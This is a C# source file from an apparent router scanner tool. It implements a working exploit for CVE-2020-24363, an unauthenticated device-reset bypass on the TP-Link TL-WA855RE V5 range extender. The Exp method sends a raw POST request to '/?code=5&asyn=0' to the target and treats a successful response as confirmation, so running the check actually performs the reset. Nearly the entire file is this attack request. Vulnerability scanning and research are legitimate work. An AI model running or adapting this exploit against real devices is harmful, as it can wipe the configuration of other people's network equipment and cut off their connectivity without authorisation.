namespace RouterScanner.Services.VulHub;

/// <summary>
/// TP-Link TL-WA855RE V5_200415 - Device Reset Auth Bypass
/// <br/><see cref="https://www.exploit-db.com/exploits/49092"/>
/// </summary>
public sealed class CVE_2020_24363 : RouterVulHubBase<CVE_2020_24363>, IRouterVulHub
{
    public string CVE => "CVE-2020-24363";
    public string VulType => "安全模式绕过";
    public string Production => "TP-Link";
    public List<string> Version => ["TL-WA855RE V5"];

    public override async ValueTask<VulResult> Exp(CancellationToken cancellationToken = default)
    {
        var rawText = $"""
            POST /?code=5&asyn=0 HTTP/1.1 
            Host: {Host}
            Accept: text/plain, /; q=0.01
            X-Requested-With: XMLHttpRequest
            User-Agent: Mozilla/5.0
            Content-Type: text/plain;charset=UTF-8
            Origin: http://{Host}
            Referer: http://{Host}
            Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9
            Connection: close
            """;

        var resp = await Http.SendAsync(rawText, SSL, cancellationToken).ConfigureAwait(false);
        if (!resp.IsSuccessStatusCode)
        {
            return OK(false);
        }

        return OK();
    }
}
